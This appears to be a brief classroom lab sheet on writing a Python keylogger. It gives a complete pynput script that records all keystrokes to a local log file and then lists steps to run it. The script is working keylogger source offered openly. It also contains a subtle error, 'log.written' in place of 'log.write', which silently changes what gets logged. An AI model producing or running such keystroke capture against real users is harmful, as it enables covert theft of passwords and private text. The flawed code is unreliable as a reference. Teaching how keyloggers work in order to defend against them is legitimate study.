AIM:- Creating a Keylogger with Python
- Write a Python script that captures and logs keystrokes from a target system.
- Execute the keylogger script and observe the logged keystrokes.
- Understand the potential security risks associated with keyloggers and the importance of protecting against them.

-----------------------------------------------------------------------------------------------------------------------

STEP 1:- Open IDLE and type following Code.

from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt","a") as log:
        try:
            log.written(f"{key.char}")

        except AttributeError:
            if key == Key.space:
                log.write(" ")
            else:
                log.write(f"{key}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

STEP 2:- Save the File and Run.

STEP 3:- In Shell, Type anything.

STEP 4:- The Keylog will be saved in a generated text file.
